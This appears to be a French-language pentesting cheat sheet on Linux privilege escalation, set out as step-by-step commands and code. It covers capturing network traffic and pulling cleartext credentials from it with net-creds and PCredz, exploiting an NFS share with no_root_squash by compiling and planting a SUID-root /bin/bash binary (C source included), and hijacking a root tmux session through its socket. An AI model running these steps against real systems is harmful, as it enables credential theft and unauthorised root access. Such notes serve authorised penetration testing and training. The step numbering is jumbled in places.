
- [[#Sniffing Tcpdump / Net-Creds / PCredz (Sudo)]]
- [[#Weak NFS Privileges]]
- [[#Hijacking Tmux Sessions]]

---
# Sniffing Tcpdump / Net-Creds / PCredz (Sudo)


1. Lancer Tcpdump afin de capturer le trafic.

```
sudo tcpdump -i ens224 
```

2. Lancer net-creds sur le pcap afin d'identifier tous les identifiants en clair https://github.com/DanMcInerney/net-creds

```
python net-creds.py -p pcapfile
```

Pcredz -> https://github.com/lgandx/PCredz

```
python3 ./Pcredz -f file-to-parse.pcap
```



---
# Weak NFS Privileges

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|

> [!TIP]
> Check si NFS avec de faibles privilèges (no_root_squash) -> création de binaire avec SUID root sur le partage possible.
> Le SUID ne fonctionne pas sur les scripts bash

1. Lister les partages NFS

```bash
showmount -e
```

2. Afficher les ACL sur les partages NFS (no_root_squach ?)

```
cat /etc/exports
```

4. Créer un binaire en c qui execute /bin/bash par exemple (suid ne marche pas sur script bash directement)
shell.c
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```


6. Monter le partage NFS sur machine attaquant

```shell
mount -t nfs <ip_target>:/<partage> /mnt
```

6. Copier le .c dans le partage

```shell
cp shell.c /mnt
```

8. Changer le owner / group / setuid sur le binaire compilé depuis attaquant

```sh
sudo chown <id_user> /mnt/shell.c
sudo chgrp <id_user> /mnt/shell.c
```

7. compiler le binaire depuis la target

```
gcc shell.c -o shell
```

8. Changer le owner / group / setuid sur le binaire compilé depuis attaquant

```
sudo chown root /mnt/shell
sudo chgrp root /mnt/shell
sudo chmod u+s /mnt/shell
```

9. Exécuter le binaire depuis la target



---

# Hijacking Tmux Sessions


> [!TIP]
> Check si possible d'hijacker une session Tmux (si lancée en tant que root)

1. Identifier les sessions tmux

```bash
ps aux | grep tmux
```

2. Voir les acl sur la session

```
ls -la /<session>
```

3. Si user fait parti du même groupe -> hijacker la session

```
tmux -S /<session>
```